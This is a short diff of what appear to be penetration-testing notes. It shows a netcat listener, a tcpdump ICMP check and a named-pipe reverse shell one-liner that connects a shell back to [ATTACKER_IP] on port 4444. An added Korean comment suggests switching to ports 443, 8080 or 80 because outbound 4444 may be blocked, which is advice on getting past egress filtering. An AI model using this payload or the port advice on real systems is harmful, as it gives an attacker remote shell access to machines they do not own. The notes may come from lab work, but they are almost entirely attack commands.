@@ -8,6 +8,8 @@ tcpdump -i tun0 icmp
 
 nc -lvnp 4444
 
+# 4444 같은 포트는 아예 outbound 에서 막아버릴 수 있으므로 443, 8080, 80 같은 신뢰성 있는 포트로 대체 테스트 필요
+
 # step 2 payload named a pipe reverse shell (Using a reverse or bind shell)
 
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc [ATTACKER_IP] 4444 >/tmp/f
